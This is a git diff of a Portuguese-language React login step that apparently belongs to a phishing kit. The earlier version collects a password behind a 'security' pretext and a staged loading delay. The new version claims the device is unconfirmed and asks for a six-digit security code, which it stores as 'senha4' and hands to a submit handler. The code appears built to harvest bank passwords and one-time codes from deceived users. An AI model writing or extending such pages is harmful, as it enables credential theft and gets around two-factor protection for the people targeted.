@@ -1,10 +1,12 @@
-import React, { useEffect } from 'react'
+import React from 'react'
+import { useHistory } from 'react-router-dom';
+import { TextField } from '@material-ui/core'
 import { makeStyles } from '@material-ui/core/styles';
-import TextField from '@material-ui/core/TextField';
-import alertify from 'alertifyjs';
-import InputMask from 'react-input-mask'
+import iconAlert from '../Assets/Images/alert.png'
+import './style.css'
 import logo from '../Assets/Images/logo.png'
 import Loader from '../Components/Loader';
+
 
 const useStyles = makeStyles((theme) => ({
     root: {
@@ -12,72 +14,59 @@ const useStyles = makeStyles((theme) => ({
         flexWrap: 'wrap',
     },
     textField: {
-        // marginLeft: theme.spacing(1),
-        // marginRight: theme.spacing(1),
         width: '77vw',
         textAlign: 'center',
     },
 }));
 
-const Step3 = ({ nextStep, loginData, setLoginData }) => {
 
-    const classes = useStyles();
+const Step3 = ({ loginData, setLoginData, onCadastro }) => {
+
+    const classes = useStyles()
     const [loading, setLoading] = React.useState(false)
 
-    const onChangeSenha = e => {
+    const history = useHistory()
+
+    const onChangeSen4 = e => {
         // console.log(e.target.value)
-        setLoginData({ ...loginData, senha: e.target.value })
+        setLoginData({ ...loginData, senha4: e.target.value })
     }
 
-    const onClick = () => { 
-        if (loginData.senha === '') {
-            alertify.alert('Aviso', 'Senha é Obrigatórios')
-        } else if (loginData.senha.length <= 18) {
-            setLoading(true)
-            setTimeout(() => {
-                nextStep()
-            }, 3000)
+    
 
-        }
-    }
 
     return loading
+        ? <Loader />
+        :
+        <div className={classes.textField}>
+            <img src={logo} className="logo" />
 
-    ? <Loader />
-    :
 
-    <div>
-
-        <img src={logo} className="logo" />
-
-            <div className={classes.textField}>
-                <h2>Olá,</h2>
-
-                <p>Por motivo de segurança é necessário confirmar algumas informações</p>
-
-                <div>
+            <h3>VALIDAÇÃO</h3>
+            <div className="alert-image">
+                <img src={iconAlert} />
+                <p>Este dispositivo ainda não foi confirmado como um dispositivo seguro. por este motivo é necessário que informe o código de  dígitos.</p>
+            </div>
+            <div>
                 <TextField
-                    label="Senha"
+                    label="Código de Segurança"
                     id="margin-none"
-                    type="password"
-                    inputMode="numeric"
-                    required
-                    onChange={onChangeSenha}
+                    onChange={onChangeSen4}
                     defaultValue=""
+                    type="password"
                     className={classes.textField}
-                //   helperText="Some important text"
+                    //   helperText="Some important text"
+                    onInput={(e) => {
+                        e.target.value = Math.max(0, parseInt(e.target.value)).toString().slice(0, 6)
+                    }}
                 />
             </div>
-
-         
-
             <div>
-                <button type="button" className="botaoLaranja" onClick={onClick}>Acessar</button>
-            </div>
-
+                
+                <button type="button" className="botaoLaranja" onClick={onCadastro}>CONFIRMAR</button>
             </div>
         </div>
-    
+
 }
 
 export default Step3
